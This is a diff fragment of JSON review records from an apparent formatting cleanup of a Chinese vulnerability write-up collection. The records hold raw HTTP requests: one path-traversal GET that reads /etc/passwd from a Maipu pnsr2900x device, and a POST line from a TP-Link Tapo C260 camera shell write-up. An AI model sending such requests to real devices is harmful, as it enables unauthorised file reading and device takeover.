+    "path": "Web安全/网络设备/TP-Link/获取 TP-Link Tapo C260 摄像头的 Shell CVE-2026-0651, CVE-2026-0652, CVE-202.md",
+    "kind": "unfenced_http",
+    "raw": "POST /v1/things//services-sync HTTP/1.1  ",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/网络设备/TP-Link/获取 TP-Link Tapo C260 摄像头的 Shell CVE-2026-0651, CVE-2026-0652, CVE-202.md",
+        "candidate_index": 0,
+        "kind": "unfenced_http",
+        "raw": "POST /v1/things//services-sync HTTP/1.1  ",
+        "disposition": "unknown_source_truncation",
+        "context_reason": "正文明确说请求省略了部分头部，样例以 `...` 标记省略；后续改造请求体是另一个示例，不合并进当前请求。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  },
+  {
+    "path": "Web安全/网络设备/迈普/迈普pnsr2900x DOWNLOAD_FILE 任意文件读取漏洞.md",
+    "kind": "unfenced_http",
+    "raw": "GET /DOWNLOAD_FILE/../../../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0Accept-Encoding: gzip, deflate, br\nConnection: keep-alive\nConnection: keep-alive",
+    "context_review_dispositions": [
+      {
+        "worker": "residual-02",
+        "path": "Web安全/网络设备/迈普/迈普pnsr2900x DOWNLOAD_FILE 任意文件读取漏洞.md",
+        "candidate_index": 0,
+        "kind": "unfenced_http",
+        "raw": "GET /DOWNLOAD_FILE/../../../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0Accept-Encoding: gzip, deflate, br\nConnection: keep-alive\nConnection: keep-alive",
+        "disposition": "unknown_source_boundary",
+        "context_reason": "User-Agent 和 Accept-Encoding 在一个物理行直接拼接，Connection 头重复；原文边界异常，不能猜测遗漏的换行或去掉重复字段。",
+        "manual_context_review": true,
+        "is_code_false_positive": false
+      }
+    ]
+  }
+]
